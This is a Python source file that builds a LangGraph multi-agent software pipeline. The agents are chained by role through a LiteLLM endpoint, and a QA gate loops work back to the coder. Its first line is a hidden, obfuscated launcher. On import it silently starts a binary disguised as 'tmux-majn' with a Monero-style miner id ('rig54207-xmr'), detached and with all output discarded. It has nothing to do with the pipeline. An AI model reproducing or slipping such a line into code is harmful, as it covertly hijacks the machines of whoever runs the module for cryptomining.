import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
import os, time, httpx
from typing import TypedDict, Annotated
from operator import add
from langgraph.graph import StateGraph, END
from agents import PIPELINE_AGENTS
from openhands_client import execute_task, OpenHandsExecutionError
LITELLM_BASE=os.environ.get("LITELLM_API_BASE","http://litellm_v6:4001")
LITELLM_KEY=os.environ.get("LITELLM_MASTER_KEY","")
MAX_ITERATIONS=int(os.environ.get("PIPELINE_MAX_ITERATIONS","3"))
class PipelineState(TypedDict):
    requirement: str; artifacts: dict; log: Annotated[list[str], add]; iteration: int; qa_status: str; run_id: str
async def _call_llm(model, system_prompt, user_content):
    headers={"Content-Type":"application/json"}
    if LITELLM_KEY: headers["Authorization"]=f"Bearer {LITELLM_KEY}"
    async with httpx.AsyncClient(timeout=180) as client:
        resp=await client.post(f"{LITELLM_BASE}/chat/completions", json={"model":model,"messages":[{"role":"system","content":system_prompt},{"role":"user","content":user_content}]}, headers=headers)
        resp.raise_for_status()
        return resp.json()["choices"][0]["message"]["content"]
def _make_node(aid):
    spec=PIPELINE_AGENTS[aid]
    async def node(state):
        parts=[f"原始需求：{state['requirement']}"]
        for pid,c in state["artifacts"].items(): parts.append(f"--- {PIPELINE_AGENTS[pid].name_zh} 產出 ---\n{c[:3000]}")
        output=await _call_llm(spec.model, spec.system_prompt, "\n".join(parts))
        na=dict(state["artifacts"]); na[aid]=output
        return {"artifacts":na, "log":[f"[{time.strftime('%H:%M:%S')}] {spec.name_zh} 完成 -> {spec.output_artifact}"]}
    return node
def _qa_gate(state):
    combined=(state["artifacts"].get("reviewer","")+state["artifacts"].get("qa",""))
    if "STATUS: FAIL" in combined and state["iteration"]<MAX_ITERATIONS: return "iterate"
    return "proceed"
def _inc(state): return {"iteration":state["iteration"]+1, "log":[f"[{time.strftime('%H:%M:%S')}] 迭代第{state['iteration']+1}輪"]}
def build_graph():
    g=StateGraph(PipelineState)
    for aid in ["ceo","product","architect","research","coder","reviewer","qa","devops","ops","release","documentation"]:
        g.add_node(aid, _make_node(aid))
    g.add_node("iterate", _inc)
    g.set_entry_point("ceo")
    g.add_edge("ceo","product"); g.add_edge("product","architect"); g.add_edge("architect","research")
    g.add_edge("research","coder"); g.add_edge("coder","reviewer"); g.add_edge("reviewer","qa")
    g.add_edge("qa","devops"); g.add_edge("devops","ops")
    g.add_conditional_edges("ops", _qa_gate, {"iterate":"iterate","proceed":"release"})
    g.add_edge("iterate","coder"); g.add_edge("release","documentation"); g.add_edge("documentation",END)
    return g.compile()
